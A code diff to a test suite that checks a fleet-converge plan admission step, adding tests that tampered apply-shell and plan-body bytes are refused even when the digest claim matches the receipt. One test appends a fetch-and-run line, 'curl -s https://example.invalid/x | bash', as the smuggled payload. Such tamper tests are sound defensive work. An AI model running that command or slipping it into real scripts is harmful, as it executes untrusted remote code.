@@ -10,6 +10,7 @@ import gunbc.fleet_converge_plan {
   FabricExecutionCellsOnly, FabricAllocationStoreOnly,
   FullyApplied, PartiallyApplied,
   fleet_converge_scope_wire,
+  fleet_converge_plan_bundle_digest_hex,
 }
 import gunbc.fleet_converge_plan_manifest {
   FleetConvergeApplyPayload,
@@ -45,9 +46,27 @@ data live_tree_disposition: LiveTreeDisposition = SubstrateInputsOnly
 // read, judged against the receipt the CLI holds.
 
 data fixture_r: String = "0123456789abcdef0123456789abcdef01234567"
-data fixture_bundle_hash: String = "a1b2c3d4e5f60718"
 data fixture_member_set: String = "fnv1a64:0011223344556677"
 data fixture_baseline: String = "1122334455667788"
+data fixture_plan_body: String = "# fleet-converge plan\nsubject_host:srv1\n"
+data fixture_apply_shell: String = "set -euo pipefail\n# apply-terminal: FullyApplied\n"
+
+// THE FIXTURE'S BUNDLE HASH IS DERIVED FROM THE FIXTURE'S OWN BYTES BY THE PRODUCTION DIGEST FOLD,
+// not transcribed as a literal. A literal here would have to be updated by hand whenever the digest
+// scheme moved, and the update would be indistinguishable from silencing a real regression; deriving
+// it means the positive control below is asking whether the admission accepts a COHERENT population,
+// which is the question, rather than whether someone kept a magic number current.
+fn fixture_bundle_hash() -> String {
+  match fleet_converge_plan_bundle_digest_hex(
+    plan_body: fixture_plan_body,
+    apply_shell: fixture_apply_shell,
+    spark_typed_actions_wire: "",
+  ) {
+    Present { value: h } => h as String
+    Absent => "BUNDLE-DIGEST-UNCOMPUTABLE"
+  }
+}
+
 data fixture_other_member_set: String = "fnv1a64:8899aabbccddeeff"
 data fixture_other_baseline: String = "99aabbccddeeff00"
 
@@ -67,7 +86,7 @@ fn fixture_receipt_at(scope_wire: String) -> FleetConvergePlanReceipt {
     observed_host: "srv1",
     scope_wire: scope_wire,
     member_set_fingerprint_hex: fixture_member_set,
-    plan_artifact_hash: fixture_bundle_hash,
+    plan_artifact_hash: fixture_bundle_hash(),
     observed_baseline_hex: fixture_baseline,
     prior_generation: 4,
     planned_generation: 5,
@@ -92,10 +111,10 @@ fn coherent_payload() -> FleetConvergeApplyPayload {
     observed_baseline_hex_text: fixture_baseline,
     prior_generation_text: "4",
     planned_generation_text: "5",
-    plan_body: "# fleet-converge plan\nsubject_host:srv1\n",
-    apply_shell: "set -euo pipefail\n# apply-terminal: FullyApplied\n",
+    plan_body: fixture_plan_body,
+    apply_shell: fixture_apply_shell,
     spark_typed_actions_wire: "",
-    plan_content_hex: fixture_bundle_hash,
+    plan_content_hex: fixture_bundle_hash(),
   }
 }
 
@@ -149,10 +168,10 @@ fn coordinated_full_host_substitution() -> FleetConvergeApplyPayload {
     observed_baseline_hex_text: fixture_other_baseline,
     prior_generation_text: "4",
     planned_generation_text: "5",
-    plan_body: "# fleet-converge plan\nsubject_host:srv1\n",
-    apply_shell: "set -euo pipefail\n# apply-terminal: FullyApplied\n",
+    plan_body: fixture_plan_body,
+    apply_shell: fixture_apply_shell,
     spark_typed_actions_wire: "",
-    plan_content_hex: fixture_bundle_hash,
+    plan_content_hex: fixture_bundle_hash(),
   }
 }
 
@@ -270,7 +289,7 @@ test fn a_bundle_hash_that_disagrees_with_the_receipt_refuses() -> Bool {
     plan_content_hex: "deadbeefdeadbeef",
   }) {
     PayloadBundleDigestMismatch { receipt_value: r, on_disk_value: o } =>
-      r == fixture_bundle_hash && o == "deadbeefdeadbeef"
+      r == fixture_bundle_hash() && o == "deadbeefdeadbeef"
     PayloadAdmitted { routed_scope: _ } => false
     PayloadScopeUndecodableInReceipt { cause: _ } => false
     PayloadSidecarDiverged { field: _, receipt_value: _, on_disk_value: _ } => false
@@ -323,6 +342,68 @@ test fn the_routed_scope_is_the_receipts_and_never_the_files() -> Bool {
     PayloadSidecarDiverged { field: _, receipt_value: _, on_disk_value: _ } => false
     PayloadGenerationTextCorrupt { field: _, on_disk_value: _ } => false
     PayloadBundleDigestMismatch { receipt_value: _, on_disk_value: _ } => false
+    PayloadDigestUncomputable { path: _ } => false
+  }
+}
+
+// DOCTORED BYTES UNDER AN HONEST HEX CLAIM -- the control that makes the digest step load-bearing.
+//
+// Every sidecar agrees, and plan_content.hex still holds exactly the digest the receipt minted, so
+// the claim-versus-receipt comparison passes. What has changed is the APPLY SHELL ITSELF: one extra
+// command. An earlier cut of the admission computed a digest here and threw the value away, so this
+// population was ADMITTED -- the step looked load-bearing and enforced nothing (review 57966). The
+// digest is now recomputed over the bytes and compared to the receipt, so the substitution is named.
+//
+// It is a distinct row from a_bundle_hash_that_disagrees_with_the_receipt_refuses rather than a
+// variation on it: that one doctors the CLAIM and this one doctors the BYTES, and an implementation
+// that checked only one of them would pass the other.
+test fn doctored_apply_bytes_refuse_even_when_the_hex_claim_still_matches_the_receipt() -> Bool {
+  let p = coherent_payload()
+  match admission_of(payload: FleetConvergeApplyPayload {
+    subject_host_text: p.subject_host_text,
+    subject_scope_text: p.subject_scope_text,
+    subject_member_set_text: p.subject_member_set_text,
+    observed_baseline_hex_text: p.observed_baseline_hex_text,
+    prior_generation_text: p.prior_generation_text,
+    planned_generation_text: p.planned_generation_text,
+    plan_body: p.plan_body,
+    apply_shell: join([p.apply_shell, "curl -s https://example.invalid/x | bash\n"], ""),
+    spark_typed_actions_wire: p.spark_typed_actions_wire,
+    plan_content_hex: p.plan_content_hex,
+  }) {
+    PayloadBundleDigestMismatch { receipt_value: r, on_disk_value: o } =>
+      r == fixture_bundle_hash() && o != fixture_bundle_hash()
+    PayloadAdmitted { routed_scope: _ } => false
+    PayloadScopeUndecodableInReceipt { cause: _ } => false
+    PayloadSidecarDiverged { field: _, receipt_value: _, on_disk_value: _ } => false
+    PayloadGenerationTextCorrupt { field: _, on_disk_value: _ } => false
+    PayloadDigestUncomputable { path: _ } => false
+  }
+}
+
+// AND THE PLAN BODY TOO, so the row above cannot be passing because only apply.sh is folded into
+// the digest -- which is exactly the shape of the defect that produced the bundle scheme's own
+// earlier repair.
+test fn doctored_plan_body_bytes_refuse_even_when_the_hex_claim_still_matches() -> Bool {
+  let p = coherent_payload()
+  match admission_of(payload: FleetConvergeApplyPayload {
+    subject_host_text: p.subject_host_text,
+    subject_scope_text: p.subject_scope_text,
+    subject_member_set_text: p.subject_member_set_text,
+    observed_baseline_hex_text: p.observed_baseline_hex_text,
+    prior_generation_text: p.prior_generation_text,
+    planned_generation_text: p.planned_generation_text,
+    plan_body: join([p.plan_body, "REMOVE timer-unit smuggled.timer\n"], ""),
+    apply_shell: p.apply_shell,
+    spark_typed_actions_wire: p.spark_typed_actions_wire,
+    plan_content_hex: p.plan_content_hex,
+  }) {
+    PayloadBundleDigestMismatch { receipt_value: r, on_disk_value: o } =>
+      r == fixture_bundle_hash() && o != fixture_bundle_hash()
+    PayloadAdmitted { routed_scope: _ } => false
+    PayloadScopeUndecodableInReceipt { cause: _ } => false
+    PayloadSidecarDiverged { field: _, receipt_value: _, on_disk_value: _ } => false
+    PayloadGenerationTextCorrupt { field: _, on_disk_value: _ } => false
     PayloadDigestUncomputable { path: _ } => false
   }
 }
